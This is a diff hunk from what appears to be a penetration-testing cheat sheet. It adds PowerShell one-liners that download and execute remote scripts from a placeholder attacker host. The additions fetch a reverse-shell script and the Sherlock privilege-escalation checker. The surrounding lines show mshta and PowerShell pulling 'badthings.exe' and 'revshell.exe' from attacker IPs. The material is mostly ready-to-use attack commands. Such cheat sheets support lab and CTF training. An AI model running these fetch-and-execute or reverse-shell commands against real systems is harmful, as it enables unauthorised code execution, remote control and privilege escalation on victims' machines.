@@ -203,6 +203,8 @@ mshta http[:]//10.10.10.10/badthings.exe
 ```
 powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
 powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://<IP_ADDRESS>/Invoke-PowerShellTcp.ps1')"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://<IP_ADDRESS>/Sherlock.ps1'); Find-AllVulns"
 ```
 
 ### [netcat for windows]
